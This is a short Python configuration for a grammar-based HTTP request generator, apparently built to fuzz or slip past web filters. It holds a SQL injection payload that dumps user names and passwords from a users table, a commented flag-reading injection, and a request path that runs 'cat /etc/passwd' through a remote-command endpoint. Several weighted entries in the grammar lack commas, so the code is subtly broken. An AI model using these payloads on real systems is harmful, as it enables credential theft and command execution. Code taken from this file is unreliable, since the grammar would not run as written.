TAINT_KEY = "taint"
# TAINT_KEY = "data"
# TAINT = "-1 union select 1,key,3 from flag"
TAINT_VAL  = "1' union select 1,group_concat(user,0x3a,password) from users #"
PATH = "/rce_get?cmd=cat%20/etc/passwd"
HOST = "IP:9001"
UIR = "1"

CHARSET_POOL = ["ascii","utf-7","base64","utf-8","utf-8le","utf-8be","utf-16","quoted-printable"]

grammar = {
    "<start>": [
        ["<request_line>","<request_headers>","<content_negotiation>","<connection_management>"]
    ],
    "<request_line>": [
        [f"GET __PATH__ HTTP/1.1\r\n"]
    ],
    "<request_headers>": [
        [f"HOST: __HOST__\r\n", "<upgrade_insecure_requests>", "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36\r\n"]
    ],
    "<upgrade_insecure_requests>": [
        ([f"Upgrade-Insecure-Requests: __UIR__\r\n"],0.7),
        (["Upgrade-Insecure-Requests: \r\n"],0.3)
    ],
    "<content_negotiation>": [
        ["<accept>","<accept_encoding>","<accept_language>"]
    ],
    "<accept>": [
        (["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n"],0.7)
        (["Accept: \r\n"],0.3)
    ],
    "<accept_encoding>": [
        (["Accept-Encoding: gzip, deflate, br\r\n"],0.7)
        (["Accept-Encoding: \r\n"],0.3)
    ],
    "<accept_language>": [
        (["Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,vi;q=0.7\r\n"],0.7)
        (["Accept-Language: \r\n"],0.3)
    ],
    "<connection_management>": [
        ["<connection>"]
    ],
    "<connection>": [
        (["Connection: keep-alive\r\n"],0.7),
        (["Connection: close\r\n"],0.3)
    ],
}
